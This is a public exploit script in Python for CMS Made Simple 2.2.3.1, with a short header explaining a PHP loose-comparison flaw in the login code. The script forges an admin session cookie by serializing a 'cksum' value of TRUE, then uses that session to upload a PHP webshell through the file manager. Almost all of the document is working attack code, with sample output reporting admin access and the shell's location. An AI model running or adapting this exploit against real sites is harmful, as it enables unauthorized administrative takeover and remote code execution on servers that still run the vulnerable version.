# Exploit Title:    CMSMS 2.2.3.1 - PHP Type Juggling
# Date:             2020-06-19
# Exploit Author:   Hodorsec
# Version:          <= 2.2.3.1
# Software Link:    http://s3.amazonaws.com/cmsms/downloads/13927/cmsms-2.2.3.1-install.zip
# Vendor Homepage:  https://www.cmsmadesimple.org/
# Tested on:        Debian 10 x64 - PHP 7.3.15-3

# Changelog in 2.2.4
# URL: http://dev.cmsmadesimple.org/project/changelog/5645
# Version 2.2.4 - Little Paradise
# ----------------------------------
# Core - General
# ...<SNIP>...
# - Fix boolean comparison in LoginOperations.

# Problem:
# A loose comparision "==" is being made for the variable "$chksum" whilst being compared to "$tmp", containing an "Encrypted" serialized list.
# Passing TRUE validates the comparision as true.

# Reproduction:
# EXAMPLE
# $ python3 poc_cmsms_2.2.3.1_type_juggling.py /var/www/html/cmsms/lib/classes/internal /tmp/shell.php http://192.168.252.13/cmsms/admin
# [*] Loginkey is: b959673102420326dd7c53a42e43b263
# [*] Checksum is: 0e07766915004133176347055865026311692244
# [*] "Encrypted" PrivateData is: #LGb1BagmBwZ6VaIcMPV7nGbkB3Z6BQbvqKAypz5uoJHvB3Z6AGbvLJEgnJ4vB3Z6AGbvL2gmqJ0vB2V6ZGgmBwp6VzIzMy91nJDvB047pmbkZwbvMJMzK3ImMKWhLJ1yVwgBB30=
# [*] SUCCESS: Gained session as admin
# [*] SUCCESS: Uploaded webshell, go to /uploads/images/HUgKnRedgyshVneXzEii.phtml

#!/usr/bin/python3
import re
import hashlib
import datetime
import string
import itertools
from builtins import map
import requests
import urllib3
import os
import sys
import base64
import random
from phpserialize import serialize,unserialize
import codecs
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36'
    }
    return headers

def get_session(url,headers):
    """
    In: URL, HTTP Headers
    Performs: Initial call to receive session ID
    Out: Python requests Session
    """
    session = requests.session()
    r = session.get(url,headers=headers,timeout=timeout,verify=False)
    return session

def gen_loginkey(phpfile,phpclass,cmsversion):
    """
    In: __FILE__, __CLASS__, CMS Version
    Performs: Concatenates input variables and MD5 hashes it
    Out: MD5 string
    """
    m = hashlib.md5()
    loginkey = phpfile + phpclass + cmsversion
    m.update(loginkey.encode('utf-8'))
    return m.hexdigest()

def gen_checksum():
    """
    In: None
    Performs: Optional for testing; iterates through hashes to find a match for loosely PHP comparisions
    Out: SHA1 hash
    """
    count = 0
    for word in map(''.join, itertools.product(string.digits, repeat=int(40))):
        sha1 = hashlib.sha1()
        sha1.update(word.encode('utf-8'))
        sha1_hash = sha1.hexdigest()
        if re.match(r'0+[eE]\d+$', sha1_hash):
            print("[+] Found a valid hash! " + sha1_hash)
            print("[+] Requests made: " + str(count))
            print("[+] Equivalent loose comparison: " + sha1_hash + " == 0\n")
            return sha1_hash
        count += 1

def return_checksum():
    """
    In: None
    Performs: Optional for testing; hashes a default loosely compared SHA1 string as match for loosely PHP comparisions
    Out: SHA1 hash
    """
    word = "10932435112"
    sha1 = hashlib.sha1()
    sha1.update(word.encode('utf-8'))
    sha1_hash = sha1.hexdigest()
    return sha1_hash

def encrypt(userid,username,checksum):
    """
    In: UserID, Username and Checksum
    Performs: Not a real "encryption", just a serialization of data, Base64 encoded and finally ROT13
    Out: Base64 + ROT13 string of serialized data
    """
    privatedata = {'uid':userid,
                    'username':username,
                    'cksum':True,   # MAGIC over here; as a Boolean for loose comparisions giving TRUE, the checksum is valid
                    'eff_uid':None,
                    'eff_username':None}
    serialized_privatedata = serialize(privatedata).decode("utf-8")
    b64_privatedata = base64.b64encode(serialized_privatedata.encode()).decode('ascii')
    enc_privatedata = codecs.encode(b64_privatedata,"rot-13")
    return enc_privatedata

def gen_userkey(phpdir,userid,session):
    """
    In: __DIR__, UserID and Python requests Session
    Performs: Optional usage and not required, as userkey "_sk_" accepts ANY key. This is more for demonstration/illustration as compared to the PHP code.
    Out: SHA1 hash of a shuffled string, based on concatenated value of __DIR__, UserID, Datetime Epoch and sessionID
    """
    session_value = ""
    for cookie in session.cookies:
        if "CMSSESSID" in cookie.name:
            session_value = cookie.value
        else:
            print("[!] Something went wrong getting a the value of the sessioncookie. Check requests, exiting...")
            exit(-1)
    dt = datetime.datetime.now().timestamp()
    concat = phpdir + str(userid) + str(int(dt)) + session_value
    sha1 = hashlib.sha1()
    sha1.update(concat.encode('utf-8'))
    sha1_hash = sha1.hexdigest()
    shuffle_sha1 = ''.join(random.sample(sha1_hash,len(sha1_hash)))
    return shuffle_sha1[:-19]

def attempt_login(url,session,loginkey,userkey,enc_privatedata,headers):
    """
    In: URL, Python requests Session, loginkey, userkey, Base64+ROT13 encoded data, HTTP headers
    Performs: An HTTP call for achieving access as an admin, using calculated cookies
    Out: An administrative session
    """
    url = url + "?_sk_=" + userkey
    cookie_loginkey_privdata = {loginkey:enc_privatedata}
    cookie_userkey = {'_sk_':userkey}
    requests.utils.add_dict_to_cookiejar(session.cookies, cookie_loginkey_privdata)
    requests.utils.add_dict_to_cookiejar(session.cookies, cookie_userkey)
    r = session.get(url,allow_redirects=True,headers=headers,verify=False)
    if r.status_code == 200:
        print("[*] SUCCESS: Gained session as admin")
    else:
        print("[!] FAIL: Something went wrong, check your requests. Exiting...")
        exit(-1)

def upload_shell(url,session,userkey,payl,headers):
    """
    In: URL, Python requests Session, userkey, file as payload, HTTP headers
    Performs: Uploading a PHP shell with a random name and with extension .phtml, since it isn't being filtered
    Out: Uploaded file
    """
    len_filename = 20
    rand_filename = ''.join(random.choice(string.ascii_letters) for i in range(len_filename)) + ".phtml"
    post_data = {'mact':'FileManager,m1_,upload,0',
                '_sk_':userkey,
                'disable_buffer':'1'}
    files = {'m1_files[]':(rand_filename,open(payl, 'rb'))}
    target = url + "/moduleinterface.php"
    r_upload = session.post(target,data=post_data,headers=headers,files=files,timeout=timeout,verify=False)
    if not "error" in r_upload.text:
        print("[*] SUCCESS: Uploaded webshell, go to /uploads/images/" + rand_filename)
    else:
        print("[!] ERROR: Something went wrong while uploading, check your requests. Exiting...")
        exit(-1)

# Main
def main(argv):
    if len(sys.argv) == 4:
        phpdir = sys.argv[1]
        payl = sys.argv[2]
        url = sys.argv[3]
    else:
        print("[*] Usage: " + sys.argv[0] + " <phpdir> <php_shellfile> <url>")
        print("[*] Example: " + sys.argv[0] + " /var/www/html/cmsms/lib/classes/internal /tmp/shell.php http://192.168.252.13/cmsms/admin\n")
        exit(0)

    # Check to see if it is a file to read as an argument
    if not os.path.isfile(payl):
        # Print error and bail, file not there
        print("[!] The following file does not exist: " + payl + "\n")
        exit(-1)

    # Specific variables, your mileage may vary
    userid = 1
    username = "admin"
    phpfile = phpdir + "/" + "class.LoginOperations.php"
    phpclass = "CMSMS\\LoginOperations" 
    cmsversion = "2.2.3.1"
    headers = http_headers()

    # Do stuff
    try:
        session = get_session(url,headers)
        loginkey = gen_loginkey(phpfile,phpclass,cmsversion)
        print("[*] Loginkey is: " + loginkey)
        checksum = return_checksum()
        print("[*] Checksum is: " + checksum)
        enc_privatedata = encrypt(userid,username,checksum)
        print("[*] \"Encrypted\" PrivateData is: " + enc_privatedata)
        userkey = gen_userkey(phpdir,userid,session)
        attempt_login(url,session,loginkey,userkey,enc_privatedata,headers)
        upload_shell(url,session,userkey,payl,headers)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
